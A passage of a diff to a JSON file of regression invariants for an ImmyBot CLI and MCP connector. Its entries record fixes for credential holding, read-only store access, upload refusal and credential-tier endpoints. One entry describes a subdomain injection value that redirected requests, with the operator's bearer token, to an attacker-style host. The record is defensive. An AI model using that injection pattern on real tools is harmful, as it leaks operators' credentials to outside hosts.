+   "summary": "the derived OAuth scope reads IMMYBOT_BASE_URL and IMMYBOT_SUBDOMAIN through cliutil.EnvOverride, so a blank .mcpb field never becomes the scope",
+   "why": "A Claude Desktop .mcpb install passes an unfilled optional field as the literal string ${user_config.immybot_base_url}. The shipped scope hook read the variables raw with os.Getenv, so that unresolved placeholder became the OAuth scope and Entra rejected every token request. config.Load already ignores unresolved placeholders through cliutil.EnvOverride; the scope hook now resolves the same way.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/immybot_scope.go",
+     "contains": "cliutil.EnvOverride(\"IMMYBOT_BASE_URL\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_scope_test.go",
+     "contains": "unresolved base url placeholder ignored",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "mirror-read-only-open",
+   "class": "local-store",
+   "summary": "the mirror-reading commands open the local store read-only and key fleet-diff snapshots at nanosecond precision",
+   "why": "The shipped novels opened the mirror read-write, so a read ran migrations as a side effect, created the snapshot table, and hit SQLITE_BUSY against a running sync. They now open it through immyOpenMirror (read-only); only fleet-diff --snapshot opens it writable. A missing table reads as not synced (immyNoSuchTable) instead of an error. Snapshot keys carry nanoseconds so two snapshots in the same second never collide.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/immybot_mirror.go",
+     "contains": "func immyOpenMirror(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_diff.go",
+     "contains": "openMirror = store.OpenWithContext",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/immybot_migrations.go",
+     "contains": "func immyNoSuchTable(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_diff.go",
+     "contains": "\"2006-01-02T15:04:05.000000000Z07:00\"",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "action-outcome-field",
+   "class": "wrong-result",
+   "summary": "one parser reads a maintenance action's outcome (result or resultName, string or integer, statusName as a signal) for session-triage, deployment-health and computer-dossier",
+   "why": "GetMaintenanceActionResponse carries the outcome as result (MaintenanceActionResult, an integer enum) with resultName beside it; the shipped readers each guessed at a field and disagreed, so a failed install could count as a success and one action could count twice. immyParseActionOutcome is the single reader.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/immybot_action_outcome.go",
+     "contains": "func immyParseActionOutcome(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_action_outcome_test.go",
+     "contains": "func TestSessionTriageReadsSpecShapedOutcome(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_action_outcome_test.go",
+     "contains": "func TestDeploymentHealthReadsSpecShapedOutcome(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_action_outcome_test.go",
+     "contains": "func TestComputerDossierReadsSpecShapedOutcome(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_action_outcome_test.go",
+     "contains": "func TestActionReadersCountAnActionOnce(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_action_outcome_test.go",
+     "contains": "func TestImmyNormalizeReasonKeepsDistinctCodes(",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "mcp-read-only-snapshot-write",
+   "class": "write-safety",
+   "summary": "fleet-diff does not claim mcp:read-only, because --snapshot writes the local store",
+   "why": "An MCP host auto-approves tools annotated read-only; fleet-diff --snapshot records a baseline row, so the read-only switch must remove it.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/immybot_mirror_write_flags_test.go",
+     "contains": "func TestMirroredNovelWriteFlagsAreNeverReadOnly(",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "novel-wrong-result-classes",
+   "class": "wrong-result",
+   "summary": "the cross-tenant novels count what the vendor schema says: version floors, exact titles, every lagging computer, exact onboarding age, every target type, PSA provider scope, schedule filters, script scope joins",
+   "why": "Review findings on the reprint, each with a test seen failing first: an unknown version never hides a laggard; a title matches exactly by default; drift counts lagging computers; onboarding-stalled compares exact age; assignment-explain evaluates each documented target type; psa-reconcile scopes to the provider; schedule-orphans never clears unresolved tenants; script-blast-radius joins global and local scripts on databaseType.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/immybot_version_lag_test.go",
+     "contains": "func TestVersionSpreadUnknownVersionNeverHidesALaggard(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_version_lag_test.go",
+     "contains": "func TestVersionSpreadDefaultMatchIsTheTitleNotASubstring(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_version_lag_test.go",
+     "contains": "func TestDriftCountsEveryLaggingComputer(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_age_filter_test.go",
+     "contains": "func TestOnboardingStalledOlderThanComparesExactAge(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_assignment_target_test.go",
+     "contains": "func TestAssignmentExplainEvaluatesEachTargetType(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_psa_scope_test.go",
+     "contains": "func TestPsaReconcileCountsOnlyLocalLinkedComputers(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_schedule_filter_test.go",
+     "contains": "func TestScheduleOrphansTenantFilterNeverClearsUnresolvedTenants(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_database_type_join_test.go",
+     "contains": "func TestFleetDiffKeepsLocalAndGlobalDeploymentsApart(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_blast_radius_scope_test.go",
+     "contains": "func TestScriptBlastRadiusJoinsOnDatabaseType(",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "new-novels-schedule-orphans-provider-link-health",
+   "class": "novel",
+   "summary": "schedule-orphans and provider-link-health, two mirror commands added with this reprint",
+   "why": "Hand-written commands kept whole by the graft: a reprint that loses them fails here.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/schedule_orphans.go",
+     "contains": "func scheduleOrphanReasons(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/provider_link_health.go",
+     "contains": "func providerLinkHealthName(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_new_novels_behavior_test.go",
+     "contains": "func TestNovelScheduleOrphansListsWhatImmyBotFlags(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_new_novels_behavior_test.go",
+     "contains": "func TestNovelProviderLinkHealthFlagsEveryFailureSignal(",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "novel-review-p1-classes-4340",
+   "class": "wrong-result",
+   "summary": "tenant propagation reaches child tenants, cross-title totals count each computer once, session-triage --status counts matches apart from failures, fleet-diff baselines record what they tracked",
+   "why": "Five review classes on the 4.34.0 reprint, each with a test seen failing first. A propagateToChildTenants assignment or deployment on a parent tenant reaches every descendant tenant (GetTenantResponse.parentTenantId), through one tenant-tree helper; an unknown hierarchy is reported as unverified or a lower bound, never dropped. drift and version-spread total distinct computers (DetectedComputerSoftwareResponse.computerId) instead of summing per-title counts. session-triage --status puts the selection in matched_actions and keeps failed_actions for real failures. fleet-diff --snapshot records each kind's shape with the snapshot, so only an unversioned (v0.1.x) baseline gets the legacy treatment and a new deployment added after a baseline with no globals is listed.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/immybot_tenant_tree.go",
+     "contains": "func immyLoadTenantTree(ctx context.Context, db *store.Store) (immyTenantTree, error) {",
+     "code_only": true,
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_tenant_propagation_test.go",
+     "contains": "func TestAssignmentExplainFollowsTenantPropagation(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_tenant_propagation_test.go",
+     "contains": "func TestScriptBlastRadiusFollowsTenantPropagation(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_tenant_propagation_test.go",
+     "contains": "func TestScriptBlastRadiusUnknownHierarchyIsALowerBound(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_count_semantics_test.go",
+     "contains": "func TestDriftComputersBehindIsDistinctComputersAcrossTitles(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_count_semantics_test.go",
+     "contains": "func TestVersionSpreadBelowFloorCountsEachComputerOnce(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/immybot_count_semantics_test.go",
+     "contains": "func TestSessionTriageStatusSelectsNonFailuresAsMatchedNotFailed(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/fleet_diff_baseline_shape_test.go",
+     "contains": "func TestFleetDiffNewBaselineWithoutGlobalsListsAddedGlobal(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/store/immybot_migrations_test.go",
+     "contains": "func TestImmyFleetSnapshotRefusesUnversionedWrite(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/store/immybot_migrations.go",
+     "contains": "immy_fleet_snapshot_kinds",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-upload-refused",
+   "class": "mcp-file-flag",
+   "summary": "the MCP executor refuses the six upload (multipart) endpoints before any request and names the CLI command; no endpoint offers a file parameter over MCP",
+   "why": "Since 0.1.10 this connector's MCP server takes no file from a tool call; uploads run with the CLI. Press 4.34.0 re-offers the six ImmyBot upload endpoints (licenses, media global/local/support, software global/local) over MCP with base64 content or an opt-in upload root. Keeping 0.1.10's behavior means nothing new is exposed by the reprint: the endpoint table lists no file parameter, search describes the endpoint as refused, and execute refuses it, confirmed or not.",
+   "status": "active",
+   "spec_encode_followup": "Press option to omit MCP multipart uploads per connector.",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "not_contains": "FileParams:      []string{\"file\"},"
+    },
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "contains": "it uploads a file, and this MCP server takes no file content or path from a tool call",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/immybot_upload_refused_test.go",
+     "contains": "func TestUploadEndpointsAreRefusedOverMCP(",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "example-guid-not-a-secret",
+   "class": "test-determinism",
+   "summary": "the provider-types client-group example uses a low-entropy placeholder GUID so gitleaks does not read it as an API key",
+   "why": "The swagger's example GUID (the Swashbuckle default) lands in this command's pp:happy-args as clientGroupTypeId=<guid>, which gitleaks' generic-api-key rule flags. A placeholder keeps the example runnable and the scan clean.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/provider-types_get-client-group-types-by-client-group-type-id-client-groups.go",
+     "contains": "\"pp:happy-args\": \"clientGroupTypeId=00000000-0000-0000-0000-000000000001\"",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "token-mint-error-masked-without-relocking",
+   "class": "secret-echo",
+   "summary": "a rejected client-credentials mint masks its error body through a view with its own lock, so a wrong or expired client secret returns an error instead of deadlocking",
+   "why": "The mint runs with the token-state lock held (authHeader, and the re-mint after a 401) and the funnel's maskCredentialText takes that lock itself, so any Entra error from the token endpoint (AADSTS7000215 invalid secret, an expired secret) hung every command and every MCP call. Same fix as ninjaone's token-errors-funnelled-at-source.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/client/immybot_token_errors.go",
+     "contains": "view := &Client{Config: c.Config, ccMu: &sync.Mutex{}}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "cliutil.SanitizeErrorBody(c.shownTokenErrorBody(body, clientID, clientSecret))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/immybot_token_error_test.go",
+     "contains": "func TestRejectedMintReturnsInsteadOfDeadlocking(",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "template-value-never-moves-the-host",
+   "class": "auth-wire",
+   "summary": "a {subdomain} value from any source must be one DNS label, and a template value in the path is escaped, so no input can move the request host or the bearer token on it",
+   "why": "buildURL spliced Config.TemplateVars into https://{subdomain}.immy.bot unvalidated, and sync --path-context (reachable from the MCP sync tool, which blocks --base-url for this reason) writes into TemplateVars. subdomain=evil.example/x? sent GET https://evil.example/x?.immy.bot/api/v1/tenants with the operator's ImmyBot bearer token. One rule in buildURL covers env, config and flag sources.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/client/url.go",
+     "contains": "var templateHostLabel = regexp.MustCompile(`^[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?$`)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/url.go",
+     "contains": "b.WriteString(url.PathEscape(v))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/immybot_template_host_test.go",
+     "contains": "func TestTemplateValueCannotMoveTheRequestHost(",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "credkit-wiring",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "The shared credential kit (internal/credkit, vendored byte-identical by tools/maintainer/vendor_credkit.py) carries every credential rule, replacing this connector's own holder, output chokepoint, journal checks and secret funnel. One credkit.Declarations literal in internal/credwire/declarations.go names every credential source and where each may go; credkit.Start is the first statement of both mains and credkit.Exit the last; stdout and stderr, every file write, every SQLite handle, MCP stdio and HTTP, every outbound client and child processes pass the kit. The credential store and the config file are declared sources and are written outside the kit (cliutil.AtomicWriteCredentialFile). Every source is held right after Start, before any argument is parsed (the kit: URLEnv, proxies; credwire.HoldStartup: every value of every file a run could read), and a request's declared credential fields as soon as its body exists, before any --dry-run preview (credwire.HoldRequest); a profile's credential flag values when the store is read (credwire.HoldProfileValues). A --stdin body is held whole from startup (StdinFlags). The run profile store is a source held right after Start through an allow-list (internal/cli/immybot_profile_hold.go), not one of the kit's Files, which would hold its own JSON keys. The kit's base_url is the instance Load selects with {subdomain} filled (credwire.selectKitBaseURL), so an explicit --config, IMMYBOT_CONFIG or --home wins over a discovered default and no origin covers another instance. An import record is held from its raw line, and a profile never turns on --stdin, since the kit holds only a body it sees on the command line.",
+   "why": "Replaced by the shared credential kit: the entries credential-holder and secret-echo-decoded-funnel recorded the layer this one retires (owner decision 2026-10-28, publish brief section 'The shared credential kit'). Connector edits the kit needs and a reprint would drop: the store's migration statements and column checks run only when their list differs from the one stamped in PRAGMA application_id (each statement passes the kit's decoders; with a credential held every open cost 4 to 7 seconds); the MCP sql tool's 4 MiB value cap is set as each connection opens (internal/credsql), because sqlite.Limit cannot reach a kit-wrapped connection; read-only opens run 'select 1' because the kit's connection does not forward Ping; the journal's tail repair goes through the kit, which refuses to append to a file another writer changed under it. cliutil.OutboundGuard and cliutil.HoldValues are test seams: an in-process unit test that never ran credkit.Start holds nothing and talks to plain-http stubs; the real binaries are driven through the kit by cmd/immybot-mcp/credential_e2e_test.go. doctor_verdict.go says 'was not tested' where the fleet's text says 'was never checked': the kit holds an auth header whole as well as its token, so with check_doctor_truth's fixture 'Bearer check-doctor-truth' the piece 'er check' matched 'never checked' and doctor's whole report was withheld.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "var Declarations = credkit.Declarations{",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "SecretEnv:",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "Origins:",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "\"response:refresh_token\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/immybot-cli/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/immybot-cli/main.go",
+     "contains": "credkit.Exit(",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/cmd/immybot-mcp/main.go",
-     "contains": "server.WithToolHandlerMiddleware(funnelToolErrors),",
+     "contains": "credkit.Start(credwire.Declarations)",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/cmd/immybot-mcp/secret_funnel_mcp.go",
-     "contains": "func funnelToolErrors(next server.ToolHandlerFunc) server.ToolHandlerFunc {",
+     "file": "cli/cmd/immybot-mcp/main.go",
+     "contains": "credkit.Exit(run())",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/cmd/immybot-mcp/secret_funnel_mcp_test.go",
-     "contains": "func TestFunnelToolErrorsWithholdsAnEchoedCredential(t *testing.T) {",
+     "file": "cli/cmd/immybot-mcp/main.go",
+     "contains": "credkit.MCPIn(os.Stdin), credkit.MCPOut()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/main.go",
+     "contains": "credkit.MCPHTTP(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/main.go",
+     "contains": "credkit.MCPTools",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/tls_key_hold.go",
+     "contains": "func holdTLSKey(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credsql/credsql.go",
+     "contains": "credkit.SQLDriver(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credsql/credsql.go",
+     "contains": "func applyLengthLimit(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "sql.Open(credsql.Driver,",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "contains": "sql.Open(credsql.Driver,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "if stamp := migrationStamp(migrations); stamped != stamp || current != StoreSchemaVersion {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/migration_stamp_test.go",
+     "contains": "func TestMigrationsRunOnlyWhenTheStampDiffers(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "func OpenReadOnlyValueCapped(dbPath string, maxValueBytes int) (*Store, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "db.ExecContext(ctx, \"select 1\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "openMCPReadOnlyStore(path, mcpSQLMaxValueBytes)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "credkit.AppendFile(p, []byte{",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cache/cache.go",
+     "contains": "credkit.WriteFile(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "credkit.WriteFile(tmp, body, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "Transport: credkit.Transport(nil)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "Transport: credkit.Transport(nil)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/probe.go",
+     "contains": "Transport: credkit.Transport(nil)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/oauth_token.go",
+     "contains": "c.Transport = OutboundGuard(c.Transport)",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/internal/client/client.go",
-     "contains": "c.holdCredentials()",
+     "contains": "sendClient.Transport = cliutil.OutboundGuard(httpClient.Transport)",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/internal/client/client.go",
-     "contains": "cliutil.FunnelHold(authHeader)",
+     "contains": "cliutil.HoldValues(\"minted:authorization\", authHeader)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "func (c *Client) shownErrorBody",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "credkit.RunCommand(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_hold.go",
+     "contains": "func HoldConfigBytes(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "config.HoldProcessCredentials(flags.configPath)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/paths.go",
+     "contains": "func AtomicWriteCredentialFile(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/credential_e2e_test.go",
+     "contains": "func TestEveryCredentialSourceIsWithheldEndToEnd(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/credential_e2e_test.go",
+     "contains": "func TestAVendorSecretInAnAnswerReachesNoSink(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/credential_e2e_test.go",
+     "contains": "func TestAToolArgumentCredentialIsHeld(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "so the credential was not tested.",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/immybot-cli/main.go",
+     "contains": "credwire.HoldStartup(os.Args[1:])",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/main.go",
+     "contains": "credwire.HoldStartup(os.Args[1:])",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/hold.go",
+     "contains": "func HoldRequest(body []byte, params map[string]string) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "credwire.HoldRequest(bodyBytes, params)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "{Source: \"proxy-userinfo\", Allowed: nil},",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/credential_sources_e2e_test.go",
+     "contains": "func TestEveryStartupSourceIsHeldBeforeArgumentsAreParsed(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/credential_sources_e2e_test.go",
+     "contains": "func TestACredentialFieldInARequestBodyIsHeldBeforeThePreview(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/credential_sources_e2e_test.go",
+     "contains": "func TestACredentialInAProfileIsHeldWhenTheStoreIsRead(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/credential_sources_e2e_test.go",
+     "contains": "func TestAProxyPasswordStillReachesItsProxy(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "holdProfileStore(data)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_profile_hold.go",
+     "contains": "func HoldProfileStores(args []string)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/immybot-cli/main.go",
+     "contains": "cli.HoldProfileStores(os.Args[1:])",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/main.go",
+     "contains": "cli.HoldProfileStores(os.Args[1:])",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "StdinFlags:",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "func selectKitBaseURL(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "{Source: \"*\", Allowed: []string{\"base_url\"}},",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/credentials_declared.go",
+     "contains": "func SelectedBaseURL(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_hold.go",
+     "contains": "func JSONLeaves(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/hold_test.go",
+     "contains": "func TestNoOriginCoversAnotherInstance(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/credential_sources_e2e_test.go",
+     "contains": "func TestANumericCredentialFieldIsHeldAsWritten(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/credential_sources_e2e_test.go",
+     "contains": "func TestAStdinBodyIsHeldWhole(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/credential_sources_e2e_test.go",
+     "contains": "func TestEveryMemberOfADuplicateProfileKeyIsHeld(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/credential_sources_e2e_test.go",
+     "contains": "func TestAProfileStoreIsFilteredByAnAllowList(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/credential_sources_e2e_test.go",
+     "contains": "func TestAnExplicitConfigChoosesTheAllowedOrigin(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/credential_sources_e2e_test.go",
+     "contains": "func TestTheSubdomainsInstanceIsTheAllowedOrigin(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "URLEnv:",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/import.go",
+     "contains": "credwire.HoldRequest([]byte(line), nil)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "\"help\": true,\n\t\t\"stdin\": true,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "\"description\": true, \"stdin\": true}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/credential_sources_e2e_test.go",
+     "contains": "func TestAnImportRecordIsHeldFromItsRawLine(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/immybot-mcp/credential_sources_e2e_test.go",
+     "contains": "func TestAProfileCannotTurnOnStdin(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credential-tier-never-cached-never-served-to-mcp",
+   "class": "secret-echo",
+   "summary": "the two endpoints that return AzureTenantAuthDetails.customAppRegSecret are credential tier: the client fetches one only inside the command run that asked for it (never from another command, a redirect or the MCP server, and any CLI it spawns), and that run prints it to the terminal only: never to --deliver, an export file, the response cache or the local store; the response cache moved to http-2, and the namespace a prior binary wrote (which may hold a redirect that reached a member) is deleted, never served",
+   "why": "customAppRegSecret is the only credential value any ImmyBot response schema carries (GET /api/v1/auth/get-azure-tenant-auth-details/{id} and the update that echoes it). The 4.34.0 read tool returned it to an MCP caller and the default GET cache wrote it to disk. One table in cliutil drives every surface, as in threatlocker's credential tier.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cliutil/immybot_credential_tier.go",
+     "contains": "func CredentialTierFor(id, rawPath string) (CredentialTierEndpoint, bool) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "if err := cliutil.CredentialTierRequestError(ctx, path, targetURL); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "if c.credentialTierCacheRefused(path, params, headers) {",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "contains": "if member, ok := cliutil.CredentialTierFor(",
+     "min_count": 3,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "func init() { cliutil.MarkMCPServerProcess() }",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "if localDataDisabled() || credentialTierStoreRefused(ctx) {",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "if err := cliutil.CredentialTierRequestError(req.Context(), req.URL.Path); err != nil {",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/immybot_credential_tier.go",
+     "contains": "func CredentialTierRequestError(ctx context.Context, targets ...string) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_credential_tier.go",
+     "contains": "c.SetContext(cliutil.WithCredentialTierRun(ctx))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/immybot_credential_tier.go",
+     "contains": "if flags != nil && flags.deliverSpec != \"\" && flags.deliverSpec != \"stdout\" {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/immybot_outbound_test.go",
+     "contains": "func TestTheCredentialTierAnswersOnlyItsOwnCommand(",
+     "min_count": 1
+    },
+    {
